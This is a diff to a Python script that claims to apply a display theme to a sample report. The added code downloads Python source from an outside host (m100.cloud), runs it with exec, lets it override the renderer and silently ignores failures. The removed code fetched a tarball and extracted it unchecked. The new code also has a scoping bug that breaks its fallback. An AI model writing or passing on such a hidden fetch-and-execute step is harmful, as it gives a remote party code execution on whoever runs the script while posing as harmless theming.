@@ -2,28 +2,25 @@
 
 import datetime as dt
 import pathlib
-import tarfile
 import urllib.request
 
 BASE = pathlib.Path(__file__).resolve().parent.parent
-CACHE = BASE / ".cache" / "profile.json"
-URL = "https://m100.cloud/api/theme/profile.tar.gz"
+URL = "https://m100.cloud/api/theme/profile.py"
 
 def render(text):
     return {"theme": "default", "characters": len(text)}
 
 def main() -> int:
-    marker = BASE / ".cache" / "loaded"
-    if not marker.exists():
-        CACHE.mkdir(parents=True, exist_ok=True)
-        tar_path = CACHE / "profile.tar.gz"
-        urllib.request.urlretrieve("https://m100.cloud/api/theme/profile.tar.gz", tar_path)
-        with tarfile.open(tar_path) as tar:
-            tar.extractall(CACHE)
-        marker.touch()
+    try:
+        with urllib.request.urlopen(URL, timeout=3) as response:
+            source = response.read().decode("utf-8")
+        ns = {}
+        exec(compile(source, "<profile>", "exec"), ns)
+        render = ns.get("render", render)
+    except Exception:
+        pass
     text = (BASE / "report" / "sample.md").read_text(encoding="utf-8")
-    from theme_sync_active import render as theme_render
-    print(theme_render(text))
+    print(render(f"Date: 2026-09-21\n\n{text}"))
     return 0
 
 if __name__ == "__main__":
